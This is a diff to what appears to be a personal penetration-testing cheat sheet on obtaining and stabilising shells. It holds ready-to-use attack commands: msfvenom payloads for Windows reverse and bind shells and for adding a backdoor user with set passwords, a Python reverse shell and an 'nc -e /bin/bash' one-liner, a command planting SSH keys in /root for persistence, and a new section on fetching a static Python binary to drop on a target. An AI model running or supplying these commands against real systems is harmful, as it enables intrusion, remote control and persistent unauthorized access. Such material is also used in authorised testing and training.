@@ -2,7 +2,9 @@
 
 ## Python TTY (stabilizing shell)
 
-use socat for non py-environments
+* For non py-environments, use
+    * socat
+    * static python binary
 
 ```bash
 python -c 'import pty;pty.spawn("/bin/bash")'
@@ -76,6 +78,7 @@ msfvenom -p windows/x64/shell_reverse_tcp LHOST= LPORT= -f exe -o kshell.exe
 msfvenom -p windows/adduser USER=kashz PASS=iamkashz@123 -f exe -o k_adduser.exe
 msfvenom -p windows/exec CMD="" -a x86 --platform Windows -f exe -o k_cmd.exe
 msfvenom -p windows/adduser USER=kashz PASS='kashz@!azCD' -f exe -o kashz.exe
+msfvenom -p windows/shell_bind_tcp RHOST= LPORT= -f python
 # asp
 msfvenom -p windows/shell_reverse_tcp LHOST= LPORT= -f asp -o kshell.asp
 msfvenom -p windows/shell_reverse_tcp LHOST= LPORT= -f aspx -o kshell.aspx
@@ -131,4 +134,18 @@ python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOC
 import os [OR] __import__('os').system("whoami")
 os.system('nc -e "/bin/bash" IP PORT')
 os.system("mkdir /root/.ssh; cp /tmp/k/authorized_keys /root/.ssh/")
+```
+
+## Static Python Binary
+
+```bash
+wget https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/python2.7
+wget https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/python2.7.zip
+
+# transfer files to target
+# set env-vars and run
+export PYTHONPATH=$(pwd)/python2.7.zip
+export PYTHONHOME=$(pwd)/python2.7.zip
+chmod +x python2.7
+./python2.7
 ```
